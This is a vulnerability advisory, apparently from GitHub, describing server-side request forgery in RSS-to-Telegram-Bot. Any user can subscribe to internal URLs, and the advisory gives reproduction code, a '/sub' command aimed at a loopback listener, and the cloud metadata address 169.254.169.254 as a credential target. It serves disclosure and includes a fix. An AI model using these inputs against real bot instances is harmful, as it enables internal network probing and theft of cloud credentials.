https://github.com/Rongronggg9/RSS-to-Telegram-Bot/security/advisories/GHSA-mmw5-vqxh-2v99 - closed as intended

# SSRF via feed subscription URL (default MULTIUSER mode lets any user trigger it)

### Version: <= 2.10.0

## Summary

Any Telegram user who can message a self-hosted RSS-to-Telegram-Bot instance can make the bot's host fetch an arbitrary URL, including addresses on the instance's own internal network (loopback, RFC1918, link-local/cloud-metadata ranges), by subscribing to that URL as a feed. The fetched response body is parsed and relayed back to the requesting user through the bot's normal feed-content flow. `MULTIUSER` mode, which allows any Telegram user (not just an operator-approved allowlist) to add subscriptions, is the shipped default (`MULTIUSER` default value `1`, documented in `docs/advanced-settings.md`).

Affected version: confirmed on commit 4a4fc39e39d6033d11dccb532d95532b01e17932 (2026-10-26), latest tagged release v2.10.0.

## Details

The feed-fetch path is:

- The `/sub` command handler accepts a user-supplied URL with no scheme/host restriction.
- `src/web/feed.py::feed_get()` calls `get(url, ...)` to retrieve the feed.
- `src/web/req.py::get()` wraps `request()`, the shared HTTP client used for every outbound fetch in the project.
- `request()` (and its underlying `_request()`) builds an aiohttp request directly from the caller-supplied URL. The only DNS-related logic in the file (`dns.asyncresolver.resolve(host, 'AAAA', ...)`) is used purely to decide whether to prefer IPv6 or retry in IPv4; it is never used to reject a resolved address that falls in a private, loopback, or link-local range. There is no allowlist/denylist of schemes, hosts, or IP ranges anywhere in req.py.

Because the fetch happens from the bot's own backend process rather than the requesting user's browser, a subscription URL pointing at `http://127.0.0.1:<internal-port>/...`, an internal service's hostname, or a cloud metadata endpoint (`http://169.254.169.254/...` on AWS/GCP/Azure-hosted instances) is fetched by the server exactly as if it were a public feed. The fetched content is handed to feedparser/listparser and surfaced back to the requesting user through the normal subscription response flow.

CWE-918 (Server-Side Request Forgery). CVSS 3.1 vector AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N = 8.2 (High) for a default, internet-reachable, cloud-hosted instance, where PR:L reflects that an attacker only needs to be an ordinary Telegram user able to message the bot (the shipped default posture), not an authenticated/privileged bot operator.

## Steps To Reproduce

1. Clone the repository at commit 4a4fc39e39d6033d11dccb532d95532b01e17932 and install requirements.txt into a Python 3.12 virtualenv.
2. Start a minimal local HTTP listener standing in for an internal network resource:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading

SECRET = b"INTERNAL-SECRET-DATA-should-not-leak-abc123"

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/rss+xml")
        self.end_headers()
        self.wfile.write(SECRET)
    def log_message(self, *a): pass

srv = HTTPServer(("127.0.0.1", 8931), Handler)
threading.Thread(target=srv.serve_forever, daemon=True).start()
```

3. Call the project's own fetch function directly, with no modification:

```python
import asyncio
from src.web.req import request

async def main():
    resp = await request("GET", "http://127.0.0.1:8931/internal", decode=True)
    print("STATUS:", resp.status)
    print("BODY:", resp.content)

asyncio.run(main())
```

4. Observed output:

```
STATUS: 200
BODY: INTERNAL-SECRET-DATA-should-not-leak-abc123
```

The unmodified request() function fetched the internal listener's body with no restriction. In the deployed bot, this same function is reached by a normal Telegram user issuing `/sub http://127.0.0.1:8931/internal` (or any internal/metadata address reachable from the host) under the default MULTIUSER=1 configuration, with the fetched content then surfaced through the normal feed-subscription response flow.

## Impact

On any self-hosted instance exposed to the internet or to a shared/cloud network, any Telegram user (not requiring operator approval under the default MULTIUSER=1 setting) can use the bot as an SSRF proxy against the instance's internal network: port-scanning internal services, reading responses from internal HTTP endpoints, and retrieving cloud instance metadata (credentials, instance identity documents) on cloud-hosted deployments.

Suggested fix: before connecting, resolve the target host and reject any resulting address that is loopback, link-local, or in a private (RFC1918) / reserved range, rechecking after each redirect hop since request() follows redirects by default; alternatively restrict feed URLs to an allowlisted scheme/host set.
